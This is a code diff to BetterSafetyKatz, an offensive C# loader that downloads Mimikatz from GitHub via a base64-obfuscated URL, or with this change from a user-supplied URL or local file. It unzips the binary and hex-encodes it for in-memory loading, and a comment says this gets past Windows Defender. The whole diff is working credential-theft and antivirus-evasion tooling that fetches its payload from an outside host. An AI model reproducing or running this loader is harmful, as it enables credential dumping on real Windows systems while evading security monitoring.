@@ -42,6 +42,7 @@ namespace BetterSafetyKatz
                     Console.WriteLine("[X] Process is not 64-bit, this version of katz won't work yo'!");
                     return;
                 }
+                string latestPath;
 
 
                 // @Arno0x
@@ -59,22 +60,41 @@ namespace BetterSafetyKatz
                 //headers needed for the github API to answer back
                 webClient.Headers.Set("User-Agent", "request");
 
-         
-                //Ask the API for the latest releases, should prob be async but lazy
-                string latestReleases = webClient.DownloadString(Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9nZW50aWxraXdpL21pbWlrYXR6L3JlbGVhc2VzL2xhdGVzdA==")));
+                if (args.Length != 0)
+                {
+                    latestPath = args[0];
+                    Console.WriteLine("[+] Fetching " + latestPath);
+                }
+                else
+                {
+                    //Ask the API for the latest releases, should prob be async but lazy
+                    string latestReleases = webClient.DownloadString(Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9nZW50aWxraXdpL21pbWlrYXR6L3JlbGVhc2VzL2xhdGVzdA==")));
 
-                //Regex out the latest url for the zip build of katz
-                Regex urlRegex = new Regex(@"https:\/\/github.com\/([a-z\.-]*)\/([a-z\.-]*)\/releases\/download\/([0-9\.-]*)\/([a-z\.-]*)_trunk\.zip", RegexOptions.IgnoreCase);
+                    //Regex out the latest url for the zip build of katz
+                    Regex urlRegex = new Regex(@"https:\/\/github.com\/([a-z\.-]*)\/([a-z\.-]*)\/releases\/download\/([0-9\.-]*)\/([a-z\.-]*)_trunk\.zip", RegexOptions.IgnoreCase);
 
-                //Pull the latest release as a ZIP file
-                string latestUrl = urlRegex.Matches(latestReleases)[0].ToString();
+                    //Pull the latest release as a ZIP file
+                    latestPath = urlRegex.Matches(latestReleases)[0].ToString();
 
+                    Console.WriteLine("[+] Contacting repo -> " + latestPath.Split(new string[] { "download/" }, StringSplitOptions.None)[1]);
+                }
 
-                Console.WriteLine("[+] Contacting repo -> " + latestUrl.Split(new string[] { "download/" }, StringSplitOptions.None)[1]);
+                //Declare as null
+                byte[] zipStream = null;
 
-                //Download that
-                byte[] zipStream = webClient.DownloadData(latestUrl);
+                //Is it a URI?
+                if (latestPath.StartsWith("http"))
+                {
+                    //Download
+                    zipStream = webClient.DownloadData(latestPath);
+                }
+                else
+                {
+                    //Read file from path
+                    zipStream = File.ReadAllBytes(latestPath);
+                }
 
+               
                 MemoryStream catStream = new MemoryStream();
 
                 // unzip.Extract(@"x64/BADWORD.exe", catStream);
@@ -85,8 +105,6 @@ namespace BetterSafetyKatz
 
                 //Turn katz into hex
                 string hexCats = BitConverter.ToString(catStream.ToArray()).Replace("-", string.Empty);
-
-
 
                 // 05.10.2020 -  Turns out we don't need to replace these to get past Defender, so it's excluded to avoid some functions breaking
                 
